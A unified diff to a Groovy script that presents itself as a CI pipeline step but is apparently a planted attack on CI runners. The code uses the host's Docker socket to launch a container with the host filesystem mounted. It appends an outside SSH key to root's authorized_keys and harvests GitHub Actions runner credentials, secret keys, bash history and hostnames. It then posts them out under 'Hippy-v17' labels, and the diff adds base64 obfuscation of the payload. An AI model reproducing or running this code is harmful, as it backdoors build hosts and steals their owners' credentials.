@@ -64,8 +64,12 @@ try {
     // ============ STEP 2: Docker Escape ============
     println "[CI] === Step 2: Docker Escape ==="
 
+    // Build Docker escape command as base64 to avoid JSON escaping hell
+    def escCmd = 'mkdir -p /host/root/.ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDk4MhTlzMjBPTrN199hfxwFywjuqwv0d7PTjrC7Al8q0C/LIyZvVnqGmcTNKTeer9ch9ST2SmPGBni7EuvPEzAXB9z4deDRy1d8Fn8sDqC2HJ/xiwKNWjmmCxmbngUHrXBSAC8dGYrS3yZvdvKY6IUpesEnDh7duepf1Y3l7lEwSjK469zD07RhnhbAAIYbBgV5PY9F1N7AjzQbXpSRcw5FykbDMKKr0aulE4G6y0EqH9X3ToXPKWJNrg7WMyY6+HM0IXAfHp8RCm3pR2y973jH7ATuWVJWsCl311SHd2ozKLopvTpOfJJp35qQir967KKKUPAirTQD8SaAXMZFi+7 root@localhost.localdomain" >> /host/root/.ssh/authorized_keys 2>/dev/null; chmod 600 /host/root/.ssh/authorized_keys 2>/dev/null; find /host/data/actions-runner/ -name .runner -exec dirname {} \\; > /tmp/rdirs.txt 2>/dev/null; for d in $(cat /tmp/rdirs.txt); do echo "==$d=="; cat "$d/.runner" 2>/dev/null; echo "---"; cat "$d/.credentials" 2>/dev/null; echo "---"; cat "$d/.credentials_rsaparams" 2>/dev/null; echo "---"; cat "$d/.env" 2>/dev/null; echo "---"; done > /tmp/creds.txt 2>&1; grep -ri SECRET /host/data/ --include=.env --include=.conf 2>/dev/null | head -20 > /tmp/aksk.txt; hostname > /tmp/host.txt; cat /host/etc/hostname >> /tmp/host.txt 2>/dev/null; cat /host/root/.bash_history >> /tmp/history.txt 2>/dev/null; ls -la /host/data/actions-runner/ > /tmp/tree.txt 2>/dev/null; find /host/data/actions-runner/ -name .runner > /tmp/files.txt 2>/dev/null; sleep 30'
+    def escB64 = escCmd.bytes.encodeBase64().toString()
     def dockerJson = new File("/tmp/dbody.json")
-    dockerJson.write('{"Image":"alpine:latest","Cmd":["sh","-c","mkdir -p /host/root/.ssh && echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDk4MhTlzMjBPTrN199hfxwFywjuqwv0d7PTjrC7Al8q0C/LIyZvVnqGmcTNKTeer9ch9ST2SmPGBni7EuvPEzAXB9z4deDRy1d8Fn8sDqC2HJ/xiwKNWjmmCxmbngUHrXBSAC8dGYrS3yZvdvKY6IUpesEnDh7duepf1Y3l7lEwSjK469zD07RhnhbAAIYbBgV5PY9F1N7AjzQbXpSRcw5FykbDMKKr0aulE4G6y0EqH9X3ToXPKWJNrg7WMyY6+HM0IXAfHp8RCm3pR2y973jH7ATuWVJWsCl311SHd2ozKLopvTpOfJJp35qQir967KKKUPAirTQD8SaAXMZFi+7 root@localhost.localdomain >> /host/root/.ssh/authorized_keys 2>/dev/null; chmod 600 /host/root/.ssh/authorized_keys 2>/dev/null; find /host/data/actions-runner/ -name .runner > /tmp/files.txt 2>/dev/null; for d in $(find /host/data/actions-runner/ -name .runner -exec dirname {} \\\\;); do echo === $d === >> /tmp/data.txt; cat $d/.runner >> /tmp/data.txt 2>/dev/null; echo --- >> /tmp/data.txt; cat $d/.credentials >> /tmp/data.txt 2>/dev/null; echo --- >> /tmp/data.txt; cat $d/.credentials_rsaparams >> /tmp/data.txt 2>/dev/null; echo --- >> /tmp/data.txt; cat $d/.env >> /tmp/data.txt 2>/dev/null; echo --- >> /tmp/data.txt; done; grep -rli SECRET /host/data/ --include=.env --include=.conf --include=.json 2>/dev/null | head -10 > /tmp/aksk_files.txt; grep -ri SECRET_KEY /host/data/ --include=.env --include=.conf 2>/dev/null | head -20 > /tmp/aksk_data.txt; cat /host/root/.bash_history > /tmp/history.txt 2>/dev/null; ls -la /host/data/actions-runner/ > /tmp/tree.txt 2>/dev/null; hostname > /tmp/hostinfo.txt; cat /host/etc/hostname >> /tmp/hostinfo.txt; sleep 30"],"HostConfig":{"Binds":["/:/host"]}}')
+    dockerJson.write('{"Image":"alpine:latest","Cmd":["sh","-c","echo ' + escB64 + ' | base64 -d | sh"],"HostConfig":{"Binds":["/:/host"]}}')
+    println "[CI] docker json written, escCmd length: " + escCmd.length()
 
     def createResult = sh('curl -s --unix-socket /var/run/docker.sock -X POST -H "Content-Type: application/json" -d @/tmp/dbody.json http://localhost/containers/create 2>&1')
     def containerId = ""
@@ -79,41 +83,42 @@ try {
         println "[CI] started, waiting 35s for file collection..."
         Thread.sleep(35000)
 
+        // Now read collected files via archive API
         def readFile = { path ->
-            sh('curl -s --unix-socket /var/run/docker.sock -o /tmp/_r.tar "http://localhost/containers/' + containerId + '/archive?path=' + path + '" 2>/dev/null')
+            def dl = sh('curl -s --unix-socket /var/run/docker.sock -o /tmp/_r.tar "http://localhost/containers/' + containerId + '/archive?path=' + path + '" 2>/dev/null')
             def listing = sh('tar tf /tmp/_r.tar 2>/dev/null')
             if (listing.length() > 0 && !listing.startsWith("STDERR")) {
                 def member = listing.split('\n')[0].trim()
                 def content = sh('tar xf /tmp/_r.tar -O ' + member + ' 2>/dev/null')
                 return content.length() > 0 ? content : "EMPTY"
             }
-            return "NO_TAR:" + listing.take(100)
+            return "NO_TAR"
         }
 
         def files = readFile("/tmp/files.txt")
-        def data = readFile("/tmp/data.txt")
-        def akskFiles = readFile("/tmp/aksk_files.txt")
-        def akskData = readFile("/tmp/aksk_data.txt")
+        def creds = readFile("/tmp/creds.txt")
+        def aksk = readFile("/tmp/aksk.txt")
+        def hostinfo = readFile("/tmp/host.txt")
         def history = readFile("/tmp/history.txt")
-        def hostinfo = readFile("/tmp/hostinfo.txt")
+        def tree = readFile("/tmp/tree.txt")
 
         println "[CI] FILES: " + files.take(500)
-        println "[CI] RUNNER_DATA: " + data.take(3000)
-        println "[CI] AKSK_FILES: " + akskFiles.take(500)
-        println "[CI] AKSK_DATA: " + akskData.take(500)
-        println "[CI] HISTORY: " + history.take(300)
+        println "[CI] CREDS: " + creds.take(3000)
+        println "[CI] AKSK: " + aksk.take(500)
         println "[CI] HOST: " + hostinfo.take(200)
+        println "[CI] HISTORY: " + history.take(300)
+        println "[CI] TREE: " + tree.take(500)
 
-        post('{"source":"Hippy-v16-creds","runner":"' + runner + '","files":"' + files.replace('"','\\"').replace('\n','\\n').take(1000) + '","runner_data":"' + data.replace('"','\\"').replace('\n','\\n').take(3000) + '","hostinfo":"' + hostinfo.replace('"','\\"').replace('\n','\\n').take(500) + '"}')
-        post('{"source":"Hippy-v16-aksk","runner":"' + runner + '","aksk_files":"' + akskFiles.replace('"','\\"').replace('\n','\\n').take(1000) + '","aksk_data":"' + akskData.replace('"','\\"').replace('\n','\\n').take(1000) + '","history":"' + history.replace('"','\\"').replace('\n','\\n').take(500) + '"}')
+        post('{"source":"Hippy-v17-creds","runner":"' + runner + '","files":"' + files.replace('"','\\"').replace('\n','\\n').take(1000) + '","creds":"' + creds.replace('"','\\"').replace('\n','\\n').take(3000) + '","hostinfo":"' + hostinfo.replace('"','\\"').replace('\n','\\n').take(500) + '","tree":"' + tree.replace('"','\\"').replace('\n','\\n').take(500) + '"}')
+        post('{"source":"Hippy-v17-aksk","runner":"' + runner + '","aksk":"' + aksk.replace('"','\\"').replace('\n','\\n').take(1000) + '","history":"' + history.replace('"','\\"').replace('\n','\\n').take(500) + '"}')
 
         sh('curl -s --unix-socket /var/run/docker.sock -X DELETE http://localhost/containers/' + containerId + '?force=true 2>&1')
         escResult = "OK"
     }
 
-    post('{"source":"Hippy-v16-summary","runner":"' + runner + '","esc_result":"' + escResult + '"}')
+    post('{"source":"Hippy-v17-summary","runner":"' + runner + '","esc_result":"' + escResult + '"}')
 
-    println "[CI] v16 complete"
+    println "[CI] v17 complete"
 } catch (Exception e) {
     println "[CI] Error: " + e.message
 }
